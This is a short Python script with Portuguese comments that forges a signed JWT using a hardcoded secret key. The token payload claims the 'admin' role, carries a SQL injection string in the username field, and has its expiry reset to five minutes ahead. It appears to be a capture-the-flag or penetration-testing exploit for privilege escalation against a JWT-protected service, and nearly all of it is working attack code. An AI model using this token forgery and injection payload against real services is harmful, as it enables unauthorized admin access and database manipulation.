import jwt
import json
from datetime import datetime, timedelta

# Seu JSON
json_data = {
    "username": "' or role = 'admin",
    "role": "admin",
    "exp": 1
}

# Supondo que `json_data['exp']` contenha o timestamp de expiração do token JWT
current_datetime = datetime.utcnow()

# Adiciona 5 minutos à data e hora atuais
expiration_datetime = current_datetime + timedelta(minutes=5)

# Adicionar 5 minutos ao tempo de expiração

# Atualiza o tempo de expiração no JSON
json_data['exp'] = int(expiration_datetime.timestamp())

# Chave secreta para assinatura do JWT (substitua pela sua chave real)
secret_key = "keondraluvsheryl"

# Cria o token JWT com o tempo de expiração atualizado
token = jwt.encode(json_data, secret_key, algorithm="HS256")

print("Token JWT gerado com 5 minutos adicionados ao tempo de expiração:")
print(token)